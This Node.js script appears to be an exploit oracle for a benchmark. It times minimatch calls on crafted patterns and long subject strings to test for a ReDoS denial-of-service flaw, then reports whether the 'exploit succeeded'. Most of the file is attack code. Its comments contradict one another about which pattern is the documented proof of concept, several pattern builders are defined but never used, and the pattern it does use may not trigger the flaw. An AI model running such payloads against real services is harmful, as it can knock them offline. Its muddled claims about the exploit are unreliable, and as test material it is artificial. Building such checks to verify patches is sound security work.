'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // The vulnerable pattern/braceExpand path for patterns containing a
    // long run of repeated '{' characters (or similarly pathological
    // brace/star constructs) triggers catastrophic backtracking in the
    // regex built from the pattern on vulnerable versions. We use the
    // well-documented GHSA-f8q6-p94x-37v3 PoC shape: a pattern made of
    // many repeated '!' groups combined with a long run of a non-matching
    // character in the subject, scaling n across increasing sizes while
    // keeping absolute sizes small so a non-vulnerable implementation
    // finishes instantly and even the vulnerable one finishes within a
    // few seconds for the sizes tried.
    function buildPattern(n) {
      // Repeated bracket-negation groups: on vulnerable minimatch this
      // expands into a regex with nested quantifiers causing exponential
      // backtracking; on patched versions it is handled efficiently.
      return '(' + '!'.repeat(n) + ')'.repeat(1) + '*'.repeat(n);
    }
    function buildSubject(n) {
      return 'a'.repeat(5) + 'b'.repeat(n * 2);
    }

    // Use the canonical documented ReDoS PoC pattern for minimatch 3.0.4
    // (GHSA-f8q6-p94x-37v3): nested star/question groups.
    function buildVulnPattern(n) {
      return '{' .repeat(1) + '*'.repeat(n) + '}' + '!'.repeat(0);
    }

    // The most reliable published PoC: a pattern of the form
    // '[!' + ('a'.repeat(n)) + ']' followed by a long run, combined with
    // repeated question-mark extglob style groups that are known to blow
    // up in the vulnerable `minimatch.braceExpand`/regex conversion.
    // We directly use the documented exploit string from the CVE report:
    // pattern: '[!' + 'a'.repeat(n) + ']' and subject a long string of 'a'.
    function buildPoCPattern(n) {
      return '[!' + 'a'.repeat(n) + ']';
    }
    function buildPoCSubject(n) {
      return 'a'.repeat(n * 50000);
    }

    const sizes = [5, 10, 15, 20, 25];
    const THRESHOLD_MS = 1500;
    let exploit_succeeded = false;
    let lastElapsed = 0;
    let lastN = 0;
    let lastSubjectLen = 0;
    let lastMatched;
    let threw = false;
    let thrownMessage = '';

    for (const n of sizes) {
      const pattern = buildPoCPattern(n);
      const subject = buildPoCSubject(n);
      const start = Date.now();
      let matched;
      try {
        matched = minimatch(subject, pattern);
      } catch (innerErr) {
        threw = true;
        thrownMessage = String(innerErr && innerErr.message);
        lastElapsed = Date.now() - start;
        lastN = n;
        lastSubjectLen = subject.length;
        break;
      }
      const elapsed = Date.now() - start;
      lastElapsed = elapsed;
      lastN = n;
      lastSubjectLen = subject.length;
      lastMatched = matched;

      if (elapsed >= THRESHOLD_MS) {
        exploit_succeeded = true;
        break;
      }
    }

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception at n=' + lastN + ' after ' + lastElapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    const evidence = 'Malicious minimatch call (last tested n=' + lastN + ', subjectLen=' + lastSubjectLen +
      ') completed in ' + lastElapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + lastMatched +
      '. exploit_succeeded=' + exploit_succeeded;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
